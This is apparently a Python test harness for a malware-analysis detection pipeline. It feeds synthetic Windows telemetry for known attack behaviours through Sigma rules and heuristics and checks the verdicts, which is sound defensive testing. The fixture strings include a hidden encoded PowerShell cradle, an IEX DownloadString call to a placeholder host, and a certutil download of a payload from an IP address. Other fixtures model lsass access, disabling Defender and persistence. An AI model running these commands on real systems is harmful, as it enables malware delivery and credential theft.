"""Detection-quality harness.

Feeds crafted, minimal-but-realistic telemetry for a handful of known
behaviors through the REAL detection pipeline (the same calls
reporting.build_report makes -- heuristics + the Sigma engine incl. custom
rules + correlation + priority annotation + verdict) and asserts that the
right detections fire and the verdict lands in the right band.

This is the measurable feedback loop: change a rule / weight, re-run this, and
see whether true positives still fire and the benign control stays clean --
instead of guessing. Runs fully offline (no VM), so it's fast and repeatable;
it exercises the detection LOGIC, which is what actually changes when we tune.

    .venv/Scripts/python.exe tests/test_detection_quality.py

Note it loads the full vendored ruleset (~6s) plus sigma_rules_custom.
"""

import sys
from datetime import datetime, timedelta
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from orchestrator import behavioral_signatures, heuristics  # noqa: E402
from orchestrator.mitre_mapping import enrich_alert  # noqa: E402
from orchestrator.sigma_engine import SigmaEngine  # noqa: E402
from orchestrator.verdict import compute_verdict  # noqa: E402

LOLBIN_ID = "c0f1a2b3-1111-4a00-9c01-5a0dbea50b01"
AMSI_ID = "c0f1a2b3-2222-4a00-9c02-5a0dbea50b02"
CORR_ID = "c0f1a2b3-3333-4a00-9c03-5a0dbea50b03"


def _ev(event_type, source="sysmon", event_id=None, ts="2026-07-03T12:00:00Z", **data):
    return {"event_type": event_type, "event_id": event_id, "source": source, "timestamp": ts, "data": data}


def _mass_file(pid, n):
    base = datetime(2026, 7, 3, 12, 0, 0)
    return [
        _ev("FileCreate", event_id=11, ts=(base + timedelta(seconds=i * 0.1)).isoformat() + "Z",
            ProcessId=str(pid), Image=r"C:\ransom.exe", TargetFilename=fr"C:\Users\u\Documents\f{i}.docx.locked")
        for i in range(n)
    ]


# --- the pipeline, faithful to reporting.build_report's alert assembly ---
def run_detection(engine, telemetry, static_analysis=None):
    alerts = [enrich_alert(e) for e in heuristics.select_alert_events(telemetry)]
    alerts += [enrich_alert(b) for b in heuristics.detect_bursts(telemetry)]
    alerts += [enrich_alert(a) for a in heuristics.detect_defender_threats(telemetry)]
    alerts += [enrich_alert(a) for a in behavioral_signatures.detect_behavioral_signatures(telemetry)]
    alerts += engine.evaluate(telemetry)  # sigma evaluate already enriches
    alerts = heuristics.annotate_priority(alerts)
    # Fixtures are pure sample behaviour, so everything is in the sample's scope
    # (PID-lineage scoping is exercised separately in test_pid_lineage).
    for a in alerts:
        a["in_sample_scope"] = True
    verdict = compute_verdict(alerts, static_analysis)
    return alerts, verdict


def fired_sigma_ids(alerts):
    return {a["sigma"]["id"] for a in alerts if a.get("sigma")}


def fired_event_types(alerts):
    return {a.get("event_type") for a in alerts if not a.get("sigma")}


def has_priority_high(alerts):
    return any(a.get("priority") == "high" for a in alerts)


# --- scenarios: behavior -> expected detection ---
SCENARIOS = [
    {
        "name": "benign_control",
        "telemetry": [
            _ev("ProcessCreate", event_id=1, ProcessId="1000",
                Image=r"C:\Windows\System32\notepad.exe", CommandLine=r"notepad.exe C:\Users\u\doc.txt"),
            _ev("ImageLoad", event_id=7, ProcessId="1000",
                ImageLoaded=r"C:\Windows\System32\kernel32.dll", Signed="true", SignatureStatus="valid"),
            _ev("FileCreate", event_id=11, ProcessId="1000",
                Image=r"C:\Windows\System32\notepad.exe", TargetFilename=r"C:\Users\u\doc.txt"),
            _ev("AmsiScanDetected", source="amsi", event_id=1, ProcessId="1000", ScanResult="1", Content="Get-Date"),
        ],
        "expect_level": {"clean"},
        "must_be_clean": True,  # no alerts at all -- the false-positive guard
    },
    {
        "name": "lolbin_cradle",
        "telemetry": [
            _ev("ProcessCreate", event_id=1, ProcessId="2000",
                Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgApAA=="),
        ],
        "expect_sigma": [LOLBIN_ID],
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "amsi_detection",
        "telemetry": [
            _ev("AmsiScanDetected", source="amsi", event_id=1, ProcessId="6000",
                ScanResult="32768", Content="IEX (New-Object Net.WebClient).DownloadString('http://x/a')"),
        ],
        "expect_sigma": [AMSI_ID],
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "persistence_runkey",
        "telemetry": [
            _ev("RegistryValueSet", event_id=13, ProcessId="3000", Image=r"C:\evil.exe",
                TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
                Details=r"C:\Users\u\AppData\Roaming\evil.exe"),
            _ev("SecurityServiceInstalled", source="security", event_id=4697, ProcessId="3000",
                ServiceName="EvilSvc", ServiceFileName=r"C:\evil.exe"),
        ],
        "expect_priority_high": True,  # Run-key annotation
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "process_injection",
        "telemetry": [
            _ev("ProcessAccess", event_id=10, SourceProcessId="4000", TargetProcessId="700",
                SourceImage=r"C:\evil.exe", TargetImage=r"C:\Windows\System32\lsass.exe", GrantedAccess="0x1010"),
            _ev("CreateRemoteThread", event_id=8, SourceProcessId="4000", TargetProcessId="800",
                SourceImage=r"C:\evil.exe", TargetImage=r"C:\Windows\System32\svchost.exe"),
            _ev("ProcessTampering", event_id=25, ProcessId="800",
                Image=r"C:\Windows\System32\svchost.exe", Type="Image is replaced"),
        ],
        "expect_event_types": {"ProcessAccess", "CreateRemoteThread", "ProcessTampering"},
        "expect_level": {"malicious"},  # EID 25 alone weighs 40
    },
    {
        "name": "mass_file_modification",
        "telemetry": _mass_file(5000, 25),
        "expect_sigma": [CORR_ID],  # the event_count correlation rule
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "credential_access_lsass",
        "telemetry": [
            _ev("ProcessAccess", event_id=10, SourceProcessId="7000", TargetProcessId="600",
                SourceImage=r"C:\Users\u\AppData\Local\Temp\mimi.exe",
                TargetImage=r"C:\Windows\System32\lsass.exe", GrantedAccess="0x1410"),
            _ev("RawAccessRead", event_id=9, ProcessId="7000",
                Image=r"C:\Users\u\AppData\Local\Temp\mimi.exe", Device=r"\Device\HarddiskVolume1"),
        ],
        "expect_event_types": {"ProcessAccess", "RawAccessRead"},
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "defender_tampering",
        "telemetry": [
            _ev("RegistryValueSet", event_id=13, ProcessId="8000", Image=r"C:\evil.exe",
                TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableRealtimeMonitoring",
                Details="DWORD (0x00000001)"),
        ],
        "expect_priority_high": True,  # Defender-tamper annotation
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "lolbin_certutil_download",
        # Models the REAL Defender-on environment: Defender terminates the
        # certutil download cradle before Sysmon logs ProcessCreate, so the
        # LOLBin Sigma rule never gets a command line to match -- but Defender
        # records the detection, which heuristics.detect_defender_threats
        # surfaces as a first-class alert. (The LOLBin rule's certutil regex
        # branch is covered at the rule level in test_sigma_correlation.py,
        # where an uninterrupted certutil ProcessCreate is available.)
        "telemetry": [
            {
                "event_type": "DefenderThreatDetected", "event_id": 1116, "source": "windefend",
                "timestamp": "2026-07-03T12:00:00Z",
                "data": {
                    "Threat Name": "Trojan:Win32/Ceprolad.A", "Severity Name": "Severe",
                    "Category Name": "Trojan",
                    "Path": r"CmdLine:_C:\Windows\System32\certutil.exe -urlcache -split -f http://185.1.2.3/payload.exe C:\Users\u\a.exe",
                },
            },
        ],
        "expect_event_types": {"DefenderThreatDetected"},
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "c2_named_pipe",
        "telemetry": [
            _ev("PipeCreated", event_id=17, ProcessId="10000",
                Image=r"C:\Users\u\AppData\Local\Temp\beacon.exe", PipeName=r"\msse-3a7bd-server"),
        ],
        "expect_priority_high": True,  # Cobalt-Strike default-pipe annotation
        "expect_level": {"suspicious", "malicious"},
    },
    {
        "name": "wmi_persistence",
        "telemetry": [
            _ev("WmiEventFilter", event_id=19, ProcessId="11000", Operation="Created",
                Name="EvilFilter", Query="SELECT * FROM __InstanceModificationEvent"),
            _ev("WmiEventConsumer", event_id=20, ProcessId="11000", Operation="Created",
                Name="EvilConsumer", Destination="powershell.exe -enc ..."),
            _ev("WmiEventConsumerToFilter", event_id=21, ProcessId="11000", Operation="Created",
                Consumer="EvilConsumer", Filter="EvilFilter"),
        ],
        "expect_event_types": {"WmiEventFilter", "WmiEventConsumer", "WmiEventConsumerToFilter"},
        "expect_level": {"suspicious", "malicious"},
    },
]


def main() -> None:
    engine = SigmaEngine(PROJECT_ROOT / "sigma_rules", min_level="medium",
                         custom_rules_dirs=[PROJECT_ROOT / "sigma_rules_custom"])
    assert not engine.load_errors, engine.load_errors

    print(f"{'scenario':<24} {'verdict':<12} {'score':>5}  {'alerts':>6}  {'sigma':>5}  result")
    print("-" * 78)
    failures = []
    for sc in SCENARIOS:
        alerts, verdict = run_detection(engine, sc["telemetry"])
        sids = fired_sigma_ids(alerts)
        problems = []

        if verdict["level"] not in sc["expect_level"]:
            problems.append(f"verdict {verdict['level']} not in {sorted(sc['expect_level'])}")
        if sc.get("must_be_clean") and alerts:
            problems.append(f"expected NO alerts, got {len(alerts)} (false positives: "
                            f"{sorted(fired_event_types(alerts) | sids)})")
        for rid in sc.get("expect_sigma", []):
            if rid not in sids:
                problems.append(f"expected sigma rule {rid} did not fire")
        for et in sc.get("expect_event_types", set()):
            if et not in fired_event_types(alerts):
                problems.append(f"expected event type {et} not alerted")
        if sc.get("expect_priority_high") and not has_priority_high(alerts):
            problems.append("expected a priority=high annotation")

        result = "PASS" if not problems else "FAIL"
        print(f"{sc['name']:<24} {verdict['level']:<12} {verdict['score']:>5}  {len(alerts):>6}  {len(sids):>5}  {result}")
        for p in problems:
            print(f"    - {p}")
        if problems:
            failures.append(sc["name"])

    print("-" * 78)
    if failures:
        print(f"FAILED: {', '.join(failures)}")
        sys.exit(1)
    print("ALL DETECTION-QUALITY SCENARIOS PASSED")


if __name__ == "__main__":
    main()
